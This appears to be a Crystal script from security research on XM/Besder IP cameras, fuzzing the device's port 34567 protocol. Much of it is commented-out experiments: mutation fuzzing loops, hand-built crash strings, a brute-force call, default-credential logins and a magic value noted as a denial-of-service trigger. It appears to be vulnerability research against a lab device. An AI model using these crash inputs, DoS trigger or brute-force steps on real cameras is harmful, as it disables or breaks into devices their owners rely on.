require "json"
require "socket"

require "./magic_fuzzer"
require "./denial_of_service"
require "./xmfuzzer"

xmm = Command::OPTalk.new
fuzzer = XMFuzzer.new xmm.to_s
fuzzer.run!
sleep 20
fuzzer.close

























# puts DenialOfService.use_message_quotes("192.168.11.109", command: Command::Unknown)

# command_names = File.read("./rsrc/lists/list_of_commands.txt").split("\n")
# command_names.each do |command_name|
#   unless command_name.split("")[0] == "#"
#     File.open("./logs/temp/#{command_name.downcase}.log", "w+") do |file|
#       xmm = XMMessage.new
#       xmm.message = JSON.build do |json|
#         json.object do
#           json.field "Name", "#{command_name}"
#           json.field "SessionID", "0x00000000"
#         end
#       end
#       m = MagicFuzzer.new(
#         magic: (0x0000..0x1000),
#         username: "admin",
#         password: "password",
#         output: file,
#         template: xmm
#         )
#       m.run
#       m.wait_until_done
#       m.report
#       m.close
#     end
#   end
# end


# commands_text = File.read("rsrc/lists/list_of_commands.txt")
# File.open("rsrc/lists/list_of_commands_unique.txt", "w+") do |out_file|
#   unique = {} of UInt64 => String
#   commands_text.split("\n").each do |line|
#     unique[line.hash] = line
#   end

#   out_file.puts unique.values.join("\n")
# end













# File.open("./rsrc/unknown.txt", "w+") do |file|
#   file.print Command::Unknown.new(session_id: 0x00000000_u32).message
# end
# File.open("./logs/radamsa/unknown.log", "w+") do |file|
#   puts "Testing connection"
#   socket = XMSocket.new("192.168.11.109", 34567)
#   xmm = Command::Unknown.new
#   socket.send_message xmm
#   puts "SENT: #{xmm.message}"
#   reply1 = socket.receive_message
#   puts "GOT: #{reply1.message}"

#   counter = 0
#   1000000.times do |x|
#     counter += 1
#     print '.' if counter % 100 == 0
#     print '\n' if counter % 10000 == 0
#     xmm = Command::Unknown.new
#     begin
#       socket = XMSocket.new("192.168.11.109", 34567)
#       xmm.message = `radamsa ./rsrc/unknown.txt` 
#       socket.send_message xmm
#       reply = socket.receive_message
#       if reply.message != reply1.message
#         file.puts "Sent: #{xmm.message.inspect}"
#         file.puts "Got: #{reply.message.inspect}"
#         print '!'
#       end
#     rescue e : XMError::SocketException
#       puts "SOCKET DOWN! #{e.inspect}"
#       raise e
#     rescue e : XMError::Exception
#       file.puts "Sent: #{xmm.message.inspect}"
#       file.puts "ERROR: #{e.inspect}" 
#       print '!'
#     rescue e
#       file.puts "Sent: #{xmm.message.inspect}"
#       file.puts "BAD ERROR: #{e.inspect}"
#       print '!'
#     ensure
#       socket.close
#     end
#   end
# end

# xmm = Command::SystemInfo.new
# pp xmm.to_s
# socket = XMSocket.new("192.168.11.109", 34567)
# socket.login("admin", Dahua.digest("password"))
# socket.send_message xmm
# puts "SENT:"
# reply = socket.receive_message
# puts "GOT: #{reply.message}"

#Brute.run("ORsEWe7l")


# BASIC
# crash_string = "\xFF" + ("\x00"*13) + "\xe8\x03" + "\x00\x00\x00\x80"
# crash_string = "{\"OPMonitor\":\"OPMonitor\",\"Name\":{\"Action\":\"Claim\",\"Parameter\":{\"Channel\":1,\"CombinMode\":\"NONE\",\"StreamType\":\"Main\",\"TransMode\":\"TCP\"}},\"SessionID\":\"9223372036854775676xAbcdef18446744073709551616\"}"
# crash_string = "{\"GetSafetyAbility\":0}"

# crash_string = "\"\""
# puts "SENDING: #{crash_string}"

# socket = XMSocket.new("192.168.11.109", 34567)
# xmm = Command::OPMonitor.new
# xmm.message = crash_string
# socket.send_message xmm
# puts "SENDING: #{crash_string}"
# reply = socket.receive_message
# puts "GOT: #{reply.message}"











# xmm.magic = 0x03f1 # LOGOUT?
# xmm.magic = 0x03fc # LOGOUT?
# xmm.magic = 0x041c # LOGOUT?
# xmm.magic = 0x0586 # LOGOUT?
# xmm.magic = 0x0598 # LOGOUT?
# xmm.magic = 0x059c # LOGOUT?
# xmm.magic = 0x05a4 # LOGOUT?
# xmm.magic = 0x05aa # LOGOUT?
# xmm.magic = 0x05d2 # LOGOUT?
# 0x6ec : Logout
# 0x6f0
# xmm.magic = 0x07de
# 0x07d0
# 0x07da
# 0x07db
# xmm.magic = 0x07e4
# 0x07ef
# 0x07f0
# 0x07f2
# 0x07fa

# BINGO! xmm.magic = 0x0678 # DOS DOS!
# 0x07f6

# xmm = Command::NoName.new
# PASSWORD = Dahua.digest("password")
# m = XMSocket.new("192.168.11.109", 34567)
# m.login("admin", PASSWORD)

# xmm.magic = 0x0000
# m.send_message xmm
# puts m.receive_message.message

# xmm.magic = 0x0550
# m.send_message xmm
# puts m.receive_message.message

# (0x2f00..0xFFFF).each do |x|
#   xmm.magic = x.to_u16

#   begin
#     print '.' if x % 0x100 == 0
#     m.send_message xmm
#     m.receive_message.message
#   rescue e
#     puts "#{x} : #{e}"
#     raise e
#   end
# end

# xmm.magic = 0x07f6

# m.send_message xmm
# puts m.receive_message.message #.bytes.map{|x| x.to_s(16).rjust(2, '0')}

# xmm.magic = 0x0000

# m.send_message xmm
# puts m.receive_message.message

# File.open("../besder_resources/logs/users/user/camera_param.log", "w") do |file|
#   Fuzzer.run(
#     Command::CameraParam,
#     magic2: (0x3..0x8),
#     username: "default",
#     password: "tluafed",
#     output: file
#     )
# end
